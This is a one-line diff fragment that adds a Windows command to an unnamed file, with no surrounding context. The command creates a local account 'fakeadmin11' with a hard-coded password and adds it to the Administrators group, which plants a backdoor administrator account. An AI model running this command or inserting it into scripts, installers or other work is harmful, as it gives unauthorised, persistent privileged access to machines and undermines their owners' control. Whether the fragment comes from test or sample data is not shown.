@@ -1,0 +1,1 @@
+cmd /c "net user fakeadmin11 L3tm3!n /add && net localgroup administrators fakeadmin11 /add"
